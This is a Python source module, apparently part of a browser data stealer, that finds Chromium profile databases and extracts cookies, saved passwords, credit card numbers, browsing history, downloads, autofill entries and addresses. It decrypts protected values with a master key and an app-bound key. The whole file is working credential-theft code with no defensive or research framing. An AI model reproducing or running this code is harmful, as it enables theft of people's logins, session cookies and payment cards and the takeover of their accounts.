from wklp_abe_grab.crypto import decrypt
from wklp_abe_grab.sqlite_reader import has_table, query
from wklp_abe_grab.timestamps import ts_chromium, ts_webkit


def find_cookie_db(profile):
    for c in (profile / "Network" / "Cookies", profile / "Cookies"):
        if c.exists() and has_table(str(c), "cookies"):
            return str(c)
    for p in profile.rglob("Cookies"):
        if p.is_file() and has_table(str(p), "cookies"):
            return str(p)
    return None


def grab_cookies(db, mk, abk):
    out = []
    for r in query(db, "SELECT host_key, name, encrypted_value, path, "
                       "expires_utc, is_secure, is_httponly, samesite "
                       "FROM cookies"):
        ev = bytes(r.pop("encrypted_value")) if r.get("encrypted_value") else b""
        r["value"] = decrypt(ev, mk, abk)
        r["expires"] = ts_chromium(r.get("expires_utc", 0))
        out.append(r)
    return out


def grab_passwords(db, mk, abk):
    out = []
    for r in query(db, "SELECT origin_url, username_value, password_value, "
                       "date_created, date_last_used, times_used FROM logins"):
        pv = bytes(r.pop("password_value")) if r.get("password_value") else b""
        r["password"] = decrypt(pv, mk, abk)
        r["created"] = ts_webkit(r.get("date_created", 0))
        r["used"] = ts_webkit(r.get("date_last_used", 0))
        out.append(r)
    return out


def grab_cards(db, mk, abk):
    out = []
    for r in query(db, "SELECT name_on_card, expiration_month, expiration_year, "
                       "card_number_encrypted FROM credit_cards"):
        cn = bytes(r.pop("card_number_encrypted")) \
            if r.get("card_number_encrypted") else b""
        r["card"] = decrypt(cn, mk, abk)
        out.append(r)
    return out


def grab_history(db):
    return query(db, "SELECT u.url, u.title, "
                     "datetime(v.visit_time/1000000 - 11644473600, "
                     "'unixepoch') AS ts "
                     "FROM visits v JOIN urls u ON v.url = u.id "
                     "ORDER BY v.visit_time DESC LIMIT 10000")


def grab_downloads(db):
    return query(db, "SELECT tab_url, target_path, "
                     "datetime(start_time/1000000 - 11644473600, "
                     "'unixepoch') AS ts, "
                     "received_bytes, total_bytes FROM downloads "
                     "ORDER BY start_time DESC")


def grab_autofill(db):
    return query(db, "SELECT name, value, count, date_created, "
                     "date_last_used FROM autofill")


def grab_addresses(db):
    r = query(db, "SELECT guid, use_count, use_date, date_modified, "
                  "language_code FROM local_addresses")
    if r:
        return r
    return query(db, "SELECT guid, use_count, use_date, date_modified, "
                     "language_code FROM autofill_profiles")


def scan_profile(profile, mk, abk):
    data = {"cookies": [], "passwords": [], "cards": [],
            "history": [], "downloads": [], "autofill": [],
            "addresses": []}

    cdb = find_cookie_db(profile)
    if cdb:
        data["cookies"] = grab_cookies(cdb, mk, abk)

    for rel in ("Login Data", "Login Data For Account"):
        p = profile / rel
        if p.exists():
            data["passwords"] += grab_passwords(str(p), mk, abk)

    wd = profile / "Web Data"
    if wd.exists():
        data["cards"] = grab_cards(str(wd), mk, abk)
        data["autofill"] = grab_autofill(str(wd))
        data["addresses"] = grab_addresses(str(wd))

    hist = profile / "History"
    if hist.exists():
        data["history"] = grab_history(str(hist))
        data["downloads"] = grab_downloads(str(hist))

    return data